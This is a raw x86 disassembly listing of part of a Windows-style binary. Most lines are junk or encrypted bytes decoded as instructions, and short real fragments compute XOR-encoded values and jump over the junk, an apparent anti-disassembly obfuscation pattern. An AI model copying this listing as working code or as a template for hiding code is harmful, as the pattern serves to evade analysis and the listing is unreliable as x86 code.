  40d20f:	sar    DWORD PTR [eax+0x6e618a87],1
  40d215:	lds    eax,FWORD PTR [esi+0x652125b7]
  40d21b:	pop    ebx
  40d21c:	les    edx,FWORD PTR [eax-0x2d]
  40d21f:	cmp    ebx,DWORD PTR [esi+0x34]
  40d222:	test   al,0x38
  40d224:	or     DWORD PTR [ebx],0xffffffd5
  40d227:	xlat   BYTE PTR ds:[ebx]
  40d228:	xor    al,0xfc
  40d22a:	das    
  40d22b:	test   BYTE PTR [esi+0x5a0f38a0],0x4e
  40d232:	rcr    ch,0x4b
  40d235:	cli    
  40d236:	scas   eax,DWORD PTR es:[edi]
  40d237:	push   ss
  40d238:	hlt    
  40d239:	mov    al,ds:0x7ebb8c34
  40d23e:	test   al,0xfb
  40d240:	inc    esi
  40d241:	arpl   WORD PTR [esi+edi*4],bx
  40d244:	dec    esi
  40d245:	test   al,0x4e
  40d247:	test   DWORD PTR [ebx-0x4950875a],eax
  40d24d:	loope  0x40d27f
  40d24f:	push   ebp
  40d250:	in     eax,0x28
  40d252:	inc    esi
  40d253:	mov    dl,0x68
  40d255:	mov    WORD PTR [eax],?
  40d257:	mov    dl,BYTE PTR ss:[esi-0x61]
  40d25b:	neg    BYTE PTR [eax-0x5c]
  40d25e:	mov    BYTE PTR [ecx-0x722cc1df],bh
  40d264:	ins    BYTE PTR es:[edi],dx
  40d265:	data16 (bad) 
  40d267:	frstor [esi-0x2f]
  40d26a:	ins    DWORD PTR es:[edi],dx
  40d26b:	cdq    
  40d26c:	jge    0x40d28b
  40d26e:	arpl   WORD PTR [edx],si
  40d270:	or     BYTE PTR [edx+edi*1],ch
  40d273:	rcl    esi,0xf9
  40d276:	or     bl,BYTE PTR [ecx+0x10]
  40d279:	sbb    al,0x30
  40d27b:	into   
  40d27c:	xchg   ebp,eax
  40d27d:	aam    0xa0
  40d27f:	or     ecx,esp
  40d281:	pop    ecx
  40d282:	outs   dx,DWORD PTR ds:[esi]
  40d283:	stos   DWORD PTR es:[edi],eax
  40d284:	push   esp
  40d285:	cmp    BYTE PTR ds:0x10db76,cl
  40d28b:	or     al,0x5d
  40d28d:	cmp    al,0x5b
  40d28f:	xchg   ebx,ecx
  40d291:	sub    ebx,ecx
  40d293:	xchg   ebx,ecx
  40d295:	dec    ecx
  40d296:	mov    eax,DWORD PTR [ebp-0x1c]
  40d299:	imul   eax,ecx
  40d29c:	sub    esp,eax
  40d29e:	mov    DWORD PTR [ebp-0x24],esp
  40d2a1:	mov    eax,DWORD PTR [ebp-0x4]
  40d2a4:	mov    ecx,0x7510854
  40d2a9:	xor    eax,ecx
  40d2ab:	mov    edx,0x32729b
  40d2b0:	add    eax,edx
  40d2b2:	mov    DWORD PTR [ebp+0x8],eax
  40d2b5:	mov    eax,DWORD PTR [ebp-0x18]
  40d2b8:	xor    eax,ecx
  40d2ba:	add    eax,edx
  40d2bc:	mov    edx,DWORD PTR [ebp+0x14]
  40d2bf:	jmp    0x40d5df
  40d2c4:	xor    ch,cl
  40d2c6:	xor    DWORD PTR [ecx+0x69b241f1],eax
  40d2cc:	xor    esi,ebx
  40d2ce:	pop    ecx
  40d2d0:	ins    BYTE PTR es:[edi],dx
  40d2d1:	fld    DWORD PTR [ecx+0x7e952ccb]
  40d2d7:	jle    0x40d356
  40d2d9:	jge    0x40d359
  40d2db:	jle    0x40d2e5
  40d2dd:	ja     0x40d2c5
  40d2df:	xchg   DWORD PTR ds:0xa9053e23,ebx
  40d2e5:	cs leave 
  40d2e7:	sbb    ch,BYTE PTR [edx-0x56b84611]
  40d2ed:	xor    al,0x10
  40d2ef:	and    edx,DWORD PTR [ebx]
  40d2f1:	mov    edi,0xb0b94a3e
  40d2f6:	dec    esi
  40d2f7:	(bad)  
  40d2f8:	sub    BYTE PTR [edx],ah
  40d2fa:	addr16 sbb eax,edi
  40d2fd:	cwde   
  40d2fe:	popf   
  40d2ff:	fld    QWORD PTR [esp+eax*8]
  40d302:	or     bl,cl
  40d304:	test   DWORD PTR [ebx+0x7dc4067f],0xdf50493f
  40d30e:	test   DWORD PTR es:[edx-0x2f],eax
  40d312:	in     al,dx
  40d313:	jnp    0x40d2dc
  40d315:	clc    
  40d316:	ror    DWORD PTR ds:0x94c1e551,1
  40d31c:	sbb    edi,DWORD PTR [edx+0x19922e44]
  40d322:	xlat   BYTE PTR ds:[ebx]
  40d323:	cdq    
  40d324:	clc    
  40d325:	sub    ebp,esi
  40d327:	add    esp,DWORD PTR [edi-0x3f]
  40d32a:	ror    DWORD PTR [esi+0x1c62a900],0xc4
  40d331:	add    DWORD PTR [ecx+0x18],ecx
  40d334:	mov    dl,0x16
  40d336:	jnp    0x40d383
  40d338:	mov    eax,0x5c390f66
  40d33d:	arpl   WORD PTR [edx],cx
  40d33f:	sub    edx,DWORD PTR [ecx]
  40d341:	push   ds
  40d342:	or     ch,BYTE PTR [edi]
  40d344:	add    eax,0x2bfc869c
  40d349:	fsub   QWORD PTR ds:0x692e2606
  40d34f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d350:	inc    eax
  40d351:	les    esi,FWORD PTR [esi+0x6d]
  40d354:	jns    0x40d326
  40d356:	cmp    al,0xa
  40d358:	cmc    
  40d359:	and    eax,esi
  40d35b:	cdq    
  40d35c:	call   0x9965a560
  40d361:	mov    edx,DWORD PTR [edx-0x55]
  40d364:	dec    ebp
  40d365:	pop    ecx
  40d366:	hlt    
  40d367:	mov    DWORD PTR [edi+0x19],ebp
  40d36a:	pushf  
  40d36b:	mov    DWORD PTR [ebx-0x2944f492],ecx
  40d371:	sub    edi,esi
  40d373:	nop
  40d374:	and    al,0xde
  40d376:	inc    ecx
  40d377:	popa   
  40d378:	mov    ebp,ecx
  40d37a:	ins    DWORD PTR es:[edi],dx
  40d37b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d37c:	or     BYTE PTR ds:0xd313a5f5,cl
  40d382:	cs mov dl,0x19
  40d385:	je     0x40d33a
  40d387:	pop    ebx
  40d388:	pushf  
  40d389:	test   DWORD PTR [ebp-0x46],ebp
  40d38c:	xor    eax,0x9fc8842a
  40d391:	popa   
  40d392:	jns    0x40d337
  40d394:	repnz or BYTE PTR [ebx+0x2e],ch
  40d398:	loop   0x40d324
  40d39a:	daa    
  40d39b:	push   ebp
  40d39d:	push   es
  40d39e:	in     al,0x77
  40d3a0:	test   BYTE PTR [esi-0x27e03d61],dh
  40d3a6:	cmp    DWORD PTR [ebx],edx
  40d3a8:	inc    ebx
  40d3a9:	sbb    eax,0xeef08053
  40d3ae:	popa   
  40d3af:	push   cs
  40d3b0:	xchg   esp,eax
  40d3b1:	rcr    BYTE PTR [esi-0x2a0c1353],1
  40d3b7:	ins    BYTE PTR es:[edi],dx
  40d3b8:	xlat   BYTE PTR ds:[ebx]
  40d3b9:	pop    ebx
  40d3ba:	aas    
  40d3bb:	push   ecx
  40d3bc:	jo     0x40d41a
  40d3be:	setle  cl
  40d3c1:	xor    cl,bh
  40d3c3:	aaa    
  40d3c4:	adc    BYTE PTR [ecx+ecx*4+0x440e8f65],bl
  40d3cb:	add    dh,ch
  40d3cd:	xchg   ebp,eax
  40d3ce:	mov    ch,0xeb
  40d3d0:	call   DWORD PTR [ebx+0x27]
  40d3d3:	aaa    
  40d3d4:	mov    ds:0x5e610e1e,eax
  40d3d9:	daa    
  40d3da:	push   ss
  40d3db:	mov    esp,0x5f6fe04
  40d3e0:	mov    eax,0x6013b31c
  40d3e5:	in     al,dx
  40d3e6:	cdq    
  40d3e7:	mov    DWORD PTR [edx+0x6ebb2436],ebx
  40d3ed:	retf   
  40d3ee:	jmp    0x94f99dea
  40d3f3:	outs   dx,BYTE PTR ds:[esi]
  40d3f4:	lds    ebp,FWORD PTR [eax]
  40d3f6:	(bad)  
  40d3f7:	clc    
  40d3f8:	adc    DWORD PTR [ecx],ebx
  40d3fa:	xchg   edi,eax
  40d3fb:	and    ecx,DWORD PTR ds:0x6238838a
  40d401:	sbb    eax,0xd77b92aa
  40d406:	dec    ecx
  40d407:	in     eax,0x37
  40d409:	inc    esi
  40d40a:	lock cmp cl,BYTE PTR [eax+0x56]
  40d40e:	mov    ds:0x8e91f63d,al
  40d413:	jne    0x40d408
  40d415:	clc    
  40d416:	dec    ecx
  40d417:	and    dl,BYTE PTR [esi+ebp*2]
  40d41a:	inc    ebp
  40d41b:	clc    
  40d41c:	sti    
  40d41d:	pop    eax
  40d41e:	or     eax,0xa0bd3e2a
  40d423:	jnp    0x40d463
  40d425:	dec    esp
  40d426:	rcr    BYTE PTR [ebx-0xe5b68a9],0xb7
  40d42d:	xor    dh,cl
  40d42f:	or     esp,ebx
  40d431:	push   esp
  40d432:	nop
  40d433:	daa    
  40d434:	aaa    
  40d435:	aaa    
  40d436:	je     0x40d466
  40d438:	xor    al,0x81
  40d43a:	xchg   esi,eax
  40d43b:	jmp    0x40d3ec
  40d43d:	sbb    eax,0xaf86d123
  40d442:	daa    
  40d443:	xchg   ecx,eax
  40d444:	pusha  
  40d445:	jne    0x40d45e
  40d447:	xor    DWORD PTR [edx+ecx*1-0x55ddddf3],ecx
  40d44e:	jge    0x40d4b5
  40d450:	jg     0x40d489
  40d452:	adc    eax,0xac19e97a
  40d457:	pop    edi
  40d458:	cmp    DWORD PTR [edx+0x61694ce],edx
  40d45e:	mov    eax,0xb1179d6b
  40d463:	arpl   WORD PTR [ecx+0x79b3c6ff],dx
  40d469:	dec    ebp
  40d46a:	sbb    al,dh
  40d46c:	and    BYTE PTR [ecx+ebp*2-0x348232bc],ah
  40d473:	add    eax,DWORD PTR [edi]
  40d475:	arpl   dx,sp
  40d477:	sbb    BYTE PTR [ebx],0x44
  40d47a:	adc    eax,0xd80466a9
  40d47f:	scas   eax,DWORD PTR es:[edi]
  40d480:	stos   DWORD PTR es:[edi],eax
  40d481:	imul   ecx,DWORD PTR [edi+0x29672c9b],0xffffffe5
  40d488:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d489:	ins    DWORD PTR es:[edi],dx
  40d48a:	int    0x41
  40d48c:	inc    eax
  40d48d:	enter  0x1aac,0x7e
  40d491:	jge    0x40d4d3
  40d493:	xchg   ebp,eax
  40d494:	stos   BYTE PTR es:[edi],al
  40d495:	inc    ecx
  40d496:	scas   eax,DWORD PTR es:[edi]
  40d497:	jns    0x40d510
  40d499:	icebp  
  40d49a:	add    eax,0xdf84bb29
  40d49f:	xchg   BYTE PTR [eax-0x4],dh
  40d4a2:	je     0x40d4f7
  40d4a4:	ret    0x5835
  40d4a7:	pop    edx
  40d4a8:	dec    ebp
  40d4a9:	cmp    eax,DWORD PTR [ebx*2+0x7f8e1ce3]
  40d4b0:	into   
  40d4b1:	scas   eax,DWORD PTR es:[edi]
  40d4b2:	adc    DWORD PTR [ecx-0x79],esp
  40d4b5:	test   DWORD PTR [ebx],edx
  40d4b7:	xchg   esp,eax
  40d4b8:	das    
  40d4b9:	xchg   ebx,eax
  40d4ba:	mov    edx,0xc02b88e1
  40d4bf:	inc    ecx
  40d4c0:	sbb    BYTE PTR [esi],al
  40d4c2:	scas   al,BYTE PTR es:[edi]
  40d4c3:	xchg   edx,eax
  40d4c4:	out    dx,al
  40d4c5:	cmp    dl,BYTE PTR [ecx-0x16f75d19]
  40d4cb:	adc    edi,edi
  40d4cd:	xor    eax,0x52004159
  40d4d2:	dec    esp
  40d4d3:	imul   edi,esi,0x1a0df129
  40d4d9:	(bad)  
  40d4da:	std    
  40d4db:	aaa    
  40d4dc:	cmp    al,0x4c
  40d4de:	jnp    0x40d4f3
  40d4e0:	frstor [ebx+0x70]
  40d4e3:	lahf   
  40d4e4:	(bad)  
  40d4e5:	xor    al,ah
  40d4e7:	add    al,0xee
  40d4e9:	cld    
  40d4ea:	lods   eax,DWORD PTR ds:[esi]
  40d4eb:	pop    ecx
  40d4ec:	mov    ds:0x8165dce1,al
  40d4f1:	ja     0x40d4c1
  40d4f3:	jecxz  0x40d4ff
  40d4f5:	dec    ebx
  40d4f6:	test   al,0xd9
  40d4f8:	xchg   esp,eax
  40d4f9:	out    dx,eax
  40d4fa:	mov    bh,0xbe
  40d4fc:	mov    bh,0x30
  40d4fe:	xchg   BYTE PTR [esi-0x36],ah
  40d501:	shr    BYTE PTR [edx-0x6c24dc3e],1
  40d507:	inc    ecx
  40d508:	dec    ebp
  40d509:	cmp    bl,0x9c
  40d50c:	pop    esp
  40d50d:	rol    DWORD PTR [edi-0x71ed6b48],0x8a
  40d514:	mov    ebp,0x6041a95f
  40d519:	outs   dx,DWORD PTR ds:[esi]
  40d51a:	arpl   WORD PTR [edi*2-0x15772266],di
  40d521:	stos   BYTE PTR es:[edi],al
  40d522:	mov    es,WORD PTR [ebp+0x283cc740]
  40d528:	div    BYTE PTR [edi-0x223a9862]
  40d52e:	daa    
  40d52f:	and    BYTE PTR [ebx-0x6f],0x2a
  40d533:	sub    cl,BYTE PTR [ebx+0x43]
  40d536:	test   DWORD PTR [ecx-0x5d685c95],esi
  40d53c:	add    ecx,DWORD PTR [eax+0x45]
  40d53f:	je     0x40d59e
  40d541:	lea    esp,[edi]
  40d543:	sti    
  40d544:	xchg   ecx,eax
  40d545:	adc    DWORD PTR [eax+0x33f16a2a],esi
  40d54b:	sar    DWORD PTR [edx-0x6f],cl
  40d54e:	jle    0x40d540
  40d550:	mov    bh,BYTE PTR [esi-0x48e033fb]
  40d556:	loope  0x40d57a
  40d558:	fstp   QWORD PTR [ebx-0x3d]
  40d55b:	out    dx,al
  40d55c:	jbe    0x40d4ec
  40d55e:	das    
  40d55f:	sub    dl,BYTE PTR [eax]
  40d561:	lahf   
  40d562:	(bad)  
  40d563:	loope  0x40d4fd
  40d565:	add    dh,BYTE PTR [esi-0x47]
  40d568:	jmp    0x40d593
  40d56a:	stos   BYTE PTR es:[edi],al
  40d56b:	dec    edx
  40d56c:	dec    ebx
  40d56d:	adc    al,0x4f
  40d56f:	les    edi,FWORD PTR [eax+0x554373e6]
  40d575:	int3   
  40d576:	jno    0x40d5c3
  40d578:	mov    ds:0x911e129e,eax
  40d57d:	inc    esp
  40d57e:	sub    al,0x43
  40d580:	enter  0x96f1,0x3e
  40d584:	xlat   BYTE PTR ds:[ebx]
  40d585:	cmp    cl,al
  40d587:	mov    eax,ds:0x1da0f0d3
  40d58c:	add    al,0xb2
  40d58e:	js     0x40d5b8
  40d590:	sbb    DWORD PTR [edx],esp
  40d592:	aas    
  40d593:	hlt    
  40d594:	sub    BYTE PTR [edi+ebx*4-0x64a4ba89],al
  40d59b:	add    DWORD PTR [ecx+0x65],esi
  40d59e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d59f:	push   0xc3bab016
  40d5a4:	xor    DWORD PTR [ecx-0x4f],edx
  40d5a7:	push   edx
  40d5a8:	xor    al,0xb4
  40d5aa:	pop    edx
  40d5ab:	ds dec esi
  40d5ad:	fiadd  WORD PTR [edx-0x793190]
  40d5b3:	imul   eax,edx,0xffffffc1
  40d5b6:	xlat   BYTE PTR ds:[ebx]
  40d5b7:	fild   QWORD PTR [esp+esi*1-0x55]
  40d5bb:	cdq    
  40d5bc:	mov    ds,WORD PTR [eax+0x16593e60]
  40d5c2:	mov    ebp,0xd8e9c84f
  40d5c7:	addr16 mov cl,0x5d
  40d5ca:	or     DWORD PTR [eax+0x6751f952],eax
  40d5d0:	mov    al,BYTE PTR [ecx-0x3b]
  40d5d3:	ja     0x40d566
  40d5d5:	stos   BYTE PTR es:[edi],al
  40d5d6:	cmp    dh,BYTE PTR [esi]
  40d5d8:	sbb    edi,DWORD PTR [edi+ebx*2+0x24]
  40d5dc:	cmc    
  40d5dd:	inc    ebx
  40d5de:	and    eax,0x8b02af0f
  40d5e3:	push   ebp
  40d5e4:	cld    
  40d5e5:	xor    edx,ecx
  40d5e7:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5ea:	lea    ecx,[edx+ecx*1+0x32729b]
  40d5f1:	cmp    ecx,eax
  40d5f3:	je     0x40dfca
  40d5f9:	mov    edi,DWORD PTR [ebp-0x18]
  40d5fc:	mov    eax,DWORD PTR [ebp+0x8]
  40d5ff:	mov    edx,DWORD PTR [ebp+0x14]
  40d602:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d606:	mov    ecx,0x7510854
  40d60b:	xor    edx,edx
  40d60d:	xor    edi,ecx
  40d60f:	mov    esi,0x32729b
  40d614:	add    edi,esi
  40d616:	div    edi
  40d618:	mov    edx,DWORD PTR [ebp-0x4]
  40d61b:	jmp    0x40d93b
  40d620:	inc    ecx
  40d621:	stos   BYTE PTR es:[edi],al
  40d622:	push   ss
  40d623:	jmp    0x40d61a
  40d625:	jae    0x40d688
  40d627:	mov    al,0xbf
  40d629:	jo     0x40d5c5
  40d62b:	jecxz  0x40d69e
  40d62d:	and    DWORD PTR ds:0x7e902b1c,edi
  40d633:	jle    0x40d6b2
  40d635:	jge    0x40d6b5
  40d637:	jle    0x40d6a3
  40d639:	jnp    0x40d5d6
  40d63b:	lods   eax,DWORD PTR ds:[esi]
  40d63c:	call   0xae1502ff
  40d641:	js     0x40d656
  40d643:	pop    ds
  40d644:	mov    ss,WORD PTR [ecx]
  40d646:	rol    DWORD PTR [ecx],1
  40d648:	imul   esp,DWORD PTR [ecx-0x26e86327],0x88bc4c06
  40d652:	push   edx
  40d653:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d654:	mov    eax,ds:0x5a6bf473
  40d659:	mov    ds:0xa902a335,eax
  40d65e:	mov    dh,0x49
  40d660:	neg    BYTE PTR [ebp+0x3]
  40d663:	mov    bh,0x4a
  40d665:	ror    BYTE PTR [ebp+0x654a46fd],cl
  40d66b:	out    dx,al
  40d66c:	retf   
  40d66d:	mov    bh,0xe8
  40d66f:	test   BYTE PTR [ebx],ch
  40d671:	repz popf 
  40d673:	add    DWORD PTR [edi],edi
  40d675:	mov    al,ds:0x9556ccc4
  40d67a:	bound  esp,QWORD PTR [edx-0x80]
  40d67d:	ja     0x40d6a1
  40d67f:	inc    esp
  40d680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d681:	mov    ebx,0x9588c938
  40d686:	pop    edi
  40d687:	pop    edi
  40d688:	ret    
  40d689:	in     eax,dx
  40d68a:	rcr    DWORD PTR ds:0xcad29920,cl
  40d690:	fstp   TBYTE PTR [esi-0x1]
  40d693:	push   ds
  40d694:	jmp    DWORD PTR [esi-0x12b72ff3]
  40d69a:	pop    ebx
  40d69b:	fnstcw WORD PTR [ebp-0x2b]
  40d69e:	dec    eax
  40d69f:	mov    edi,DWORD PTR [edx]
  40d6a1:	mul    DWORD PTR [edx-0x5d]
  40d6a4:	bound  ecx,QWORD PTR [eax]
  40d6a6:	sub    ah,BYTE PTR [esi-0x4d]
  40d6a9:	mov    DWORD PTR [ebx+0x25],esi
  40d6ac:	inc    ebx
  40d6ad:	mov    edi,0xf39a8847
  40d6b2:	sub    bh,cl
  40d6b4:	or     BYTE PTR [eax+0x34],cl
  40d6b7:	inc    esi
  40d6b8:	adc    bh,BYTE PTR [eax]
  40d6ba:	xchg   ebx,eax
  40d6bb:	jmp    0xe276:0x379280b2
  40d6c2:	data16 stc 
  40d6c4:	mov    dh,0x77
  40d6c6:	xor    bl,cl
  40d6c8:	js     0x40d666
  40d6ca:	jne    0x40d699
  40d6cc:	add    DWORD PTR [esi+edi*1+0x2f],esi
  40d6d0:	sbb    edi,DWORD PTR [ebp-0x37b3634a]
  40d6d6:	xor    BYTE PTR [ecx-0x2],ch
  40d6d9:	cmp    eax,0xc32a7da5
  40d6de:	gs add eax,0x72e06dfa
  40d6e4:	xchg   edi,eax
  40d6e5:	imul   ebx,DWORD PTR [edi-0x7730219a],0xffffffcb
  40d6ec:	adc    edx,0xffffffa3
  40d6ef:	(bad)  
  40d6f0:	xchg   ecx,eax
  40d6f1:	xor    dh,dh
  40d6f3:	push   edx
  40d6f4:	jecxz  0x40d73f
  40d6f6:	jae    0x40d73f
  40d6f8:	pop    ds
  40d6f9:	sbb    al,0x37
  40d6fb:	jecxz  0x40d6ff
  40d6fd:	addr16 mov ecx,0xda62f7f0
  40d703:	retf   
  40d704:	dec    ecx
  40d705:	mov    bh,0xc5
  40d707:	dec    ecx
  40d708:	ins    BYTE PTR es:[edi],dx
  40d709:	ret    0xc797
  40d70c:	stos   BYTE PTR es:[edi],al
  40d70d:	and    eax,0xe131646f
  40d712:	data16 and al,0x3
  40d715:	push   esi
  40d716:	shl    BYTE PTR [ebx-0x679a9a3b],1
  40d71c:	inc    esp
  40d71d:	sbb    dh,cl
  40d71f:	iret   
  40d720:	jne    0x40d79a
  40d722:	icebp  
  40d723:	jecxz  0x40d6d6
  40d725:	and    bl,BYTE PTR [ecx+edx*4]
  40d728:	lods   al,BYTE PTR ds:[esi]
  40d729:	inc    esi
  40d72a:	out    0x54,al
  40d72c:	xchg   ecx,eax
  40d72d:	in     eax,0xe9
  40d72f:	inc    ebx
  40d730:	mov    cl,0x43
  40d732:	fdivp  st(4),st
  40d734:	loope  0x40d6c6
  40d736:	iret   
  40d737:	add    ecx,edi
  40d739:	cmp    bh,0x53
  40d73c:	sahf   
  40d73d:	call   0xd835:0xb7609a39
  40d744:	je     0x40d6e2
  40d746:	scas   eax,DWORD PTR es:[edi]
  40d747:	xor    esi,esi
  40d749:	ins    DWORD PTR es:[edi],dx
  40d74a:	pop    esp
  40d74b:	imul   ebp,DWORD PTR [ecx+edi*8+0x2f],0xffffff89
  40d750:	ds inc ebx
  40d752:	mov    dh,0xf6
  40d754:	loop   0x40d7c3
  40d756:	dec    edi
  40d757:	popf   
  40d758:	in     al,0xfb
  40d75a:	(bad)  
  40d75b:	arpl   cx,bx
  40d75d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d75e:	inc    ebx
  40d75f:	lods   eax,DWORD PTR ds:[esi]
  40d760:	mov    DWORD PTR [edi+0x1a],esi
  40d763:	outs   dx,DWORD PTR ds:[esi]
  40d764:	lea    esp,[esi+0x48]
  40d767:	mov    al,ds:0x3ac1c2c1
  40d76c:	dec    esp
  40d76d:	lahf   
  40d76e:	mov    al,0x82
  40d770:	mul    BYTE PTR [ecx]
  40d772:	pop    ecx
  40d773:	ret    0x186
  40d776:	stos   BYTE PTR es:[edi],al
  40d777:	enter  0x3aeb,0x96
  40d77b:	jecxz  0x40d7bb
  40d77d:	icebp  
  40d77e:	push   0x48dd2e04
  40d783:	pop    esp
  40d784:	in     eax,0x86
  40d786:	je     0x40d7b2
  40d788:	ficomp DWORD PTR [eax]
  40d78a:	and    al,0x68
  40d78c:	mov    bh,BYTE PTR [eax+0x3]
  40d78f:	jmp    0x251a:0xc1af4f2
  40d796:	jo     0x40d80c
  40d798:	jns    0x40d723
  40d79a:	add    al,0xf3
  40d79c:	je     0x40d7ee
  40d79e:	in     al,dx
  40d79f:	mov    ebx,0xb8e6a04d
  40d7a4:	lahf   
  40d7a5:	mov    ecx,0xe6451bfe
  40d7aa:	sub    DWORD PTR [esi+0x16],0x4c
  40d7ae:	fnstcw WORD PTR [eax]
  40d7b0:	sub    al,0xa3
  40d7b2:	gs ds mov bl,0x18
  40d7b6:	dec    eax
  40d7b7:	add    eax,0xcfd24784
  40d7bc:	leave  
  40d7bd:	fidiv  WORD PTR [esi+eax*1-0x3f3ebd8a]
  40d7c4:	ret    0x56de
  40d7c7:	dec    ebp
  40d7c8:	inc    eax
  40d7c9:	outs   dx,BYTE PTR ds:[esi]
  40d7ca:	ins    BYTE PTR es:[edi],dx
  40d7cb:	sub    BYTE PTR [ebx+edx*4+0x11],ch
  40d7cf:	push   ss
  40d7d0:	dec    esi
  40d7d1:	aam    0xd5
  40d7d3:	push   0x9ca6b36c
  40d7d8:	dec    ecx
  40d7d9:	pop    esi
  40d7da:	aas    
  40d7db:	mov    ss,WORD PTR ds:0xb0d10d1
  40d7e1:	mov    dh,0x40
  40d7e3:	xchg   esp,eax
  40d7e4:	test   dl,bl
  40d7e6:	jg     0x40d79e
  40d7e8:	mov    esi,0xa2d2c0b2
  40d7ed:	repnz adc eax,0x428c4c23
  40d7f3:	jecxz  0x40d7e5
  40d7f5:	mov    cl,0x1b
  40d7f7:	popf   
  40d7f8:	mov    esp,0xf4c4b7d1
  40d7fd:	and    BYTE PTR [ecx],ah
  40d7ff:	push   esi
  40d800:	sbb    ebx,DWORD PTR [edx+0x5b]
  40d803:	loope  0x40d843
  40d805:	mov    eax,0x42edbf39
  40d80a:	aam    0x10
  40d80c:	lahf   
  40d80d:	sbb    BYTE PTR [edi-0x6e6feb94],ch
  40d813:	sbb    BYTE PTR [eax+ecx*4],al
  40d816:	sbb    bl,BYTE PTR [eax+0x7c]
  40d819:	retf   0x7d6d
  40d81c:	pop    ecx
  40d81d:	mov    eax,0x356ac6b9
  40d822:	push   0xa68db895
  40d827:	mov    ch,BYTE PTR ds:0x74b29a6b
  40d82d:	cdq    
  40d82e:	xchg   ebx,eax
  40d82f:	stos   DWORD PTR es:[edi],eax
  40d830:	aad    0x50
  40d832:	inc    ebp
  40d833:	ret    
  40d834:	dec    BYTE PTR [ecx]
  40d836:	jo     0x40d810
  40d838:	jecxz  0x40d7f5
  40d83a:	hlt    
  40d83b:	sbb    eax,0x824e4e4e
  40d840:	into   
  40d841:	mov    ebp,0xeffeb2bf
  40d846:	in     eax,0x13
  40d848:	push   0x8
  40d84a:	jge    0x40d81d
  40d84c:	in     eax,0xe1
  40d84e:	jbe    0x40d8b1
  40d850:	push   ecx
  40d851:	fnstcw WORD PTR [eax-0x47]
  40d854:	mov    ecx,DWORD PTR cs:[esi+0x4fdaf9d1]
  40d85b:	cdq    
  40d85c:	sbb    al,0x6e
  40d85e:	push   0xffffff82
  40d860:	jb     0x40d876
  40d862:	jne    0x40d891
  40d864:	push   esi
  40d865:	add    DWORD PTR [eax-0x5f],esi
  40d868:	pop    esp
  40d869:	test   ecx,ecx
  40d86b:	push   ss
  40d86c:	push   0x79cfc5f0
  40d871:	push   0x28193f72
  40d876:	in     al,0x65
  40d878:	pusha  
  40d879:	rcr    DWORD PTR [ecx],cl
  40d87b:	inc    eax
  40d87c:	into   
  40d87d:	xchg   ecx,eax
  40d87e:	pop    ss
  40d87f:	aam    0x24
  40d881:	lea    ebp,[ecx-0x50]
  40d884:	es mov edx,0x4e2de608
  40d88a:	in     al,0xcf
  40d88c:	sbb    edx,DWORD PTR [ebx]
  40d88e:	loope  0x40d8e5
  40d890:	dec    edx
  40d891:	(bad)  
  40d892:	out    dx,al
  40d893:	pop    ecx
  40d894:	and    al,0x3f
  40d896:	das    
  40d897:	sub    al,0xb4
  40d899:	stos   BYTE PTR es:[edi],al
  40d89a:	jb     0x40d81e
  40d89c:	imul   eax,DWORD PTR [esp+ecx*8+0xfa5c4c3],0xffffffc8
  40d8a4:	in     eax,dx
  40d8a5:	pop    es
  40d8a6:	mov    eax,0x584f15b0
  40d8ab:	dec    ebx
  40d8ac:	mov    al,0x68
  40d8ae:	in     eax,0x4f
  40d8b0:	push   esi
  40d8b1:	(bad)  
  40d8b2:	cdq    
  40d8b3:	lock nop
  40d8b5:	pop    ds
  40d8b6:	xor    eax,0x839e276b
  40d8bb:	push   esp
  40d8bc:	std    
  40d8bd:	inc    eax
  40d8be:	rol    bl,1
  40d8c0:	call   0xbde:0x93f13c52
  40d8c7:	int    0x1e
  40d8c9:	add    eax,0x76c41d9c
  40d8ce:	jecxz  0x40d87e
  40d8d0:	push   0xffffffc9
  40d8d2:	pop    ds
  40d8d3:	push   cs
  40d8d4:	sbb    dh,BYTE PTR [ecx-0x1f]
  40d8d7:	js     0x40d8b7
  40d8d9:	add    al,0x24
  40d8db:	aaa    
  40d8dc:	add    BYTE PTR [ebp+0x4a85ee26],al
  40d8e2:	in     eax,0xe8
  40d8e4:	push   edx
  40d8e5:	enter  0x50b8,0x4a
  40d8e9:	aad    0xf9
  40d8eb:	mov    BYTE PTR [edx+ecx*8],dl
  40d8ee:	pop    edx
  40d8ef:	pusha  
  40d8f0:	cmp    ah,BYTE PTR es:[ebp+0x53042bf3]
  40d8f7:	hlt    
  40d8f8:	fwait
  40d8f9:	pop    ds
  40d8fa:	inc    esi
  40d8fb:	or     edi,0x9bc93f7a
  40d901:	jp     0x40d8d3
  40d903:	xchg   ebp,eax
  40d904:	int    0x15
  40d906:	call   0x8541:0x8887417f
  40d90d:	cmp    eax,0xcbfbbe02
  40d912:	cmc    
  40d913:	mov    ds:0x526fbdb6,eax
  40d918:	out    0xe0,al
  40d91a:	sub    eax,DWORD PTR [esi]
  40d91c:	fld    DWORD PTR [esi-0x793fc7ac]
  40d922:	call   DWORD PTR [esi-0x63]
  40d925:	xor    BYTE PTR [ecx+0x1c2ee01b],dl
  40d92b:	jmp    0x5d83948e
  40d930:	and    BYTE PTR [ecx+0x789ea37c],bl
  40d936:	sbb    BYTE PTR [edi],al
  40d938:	rcr    BYTE PTR [edi+0x32],1
  40d93b:	xor    edx,ecx
  40d93d:	lea    eax,[edx+eax*1+0x32729b]
  40d944:	jmp    0x40dc64
  40d949:	das    
  40d94a:	sub    BYTE PTR [ecx],0x25
  40d94d:	mov    cl,0xb5
  40d94f:	xor    edx,DWORD PTR [eax-0x2c802913]
  40d955:	femms  
  40d957:	ja     0x40d9b0
  40d959:	ss lahf 
  40d95b:	jle    0x40d9db
  40d95d:	jge    0x40d9dc
  40d95f:	jle    0x40d9df
  40d961:	lahf   
  40d962:	cdq    
  40d963:	jne    0x40d90c
  40d965:	dec    esi
  40d966:	retf   
  40d967:	jge    0x40d8f6
  40d969:	xor    al,0x9e
  40d96b:	pop    edi
  40d96c:	mov    ds:0xd682b8f0,eax
  40d971:	push   edx
  40d972:	popa   
  40d973:	mov    esi,0xc2625887
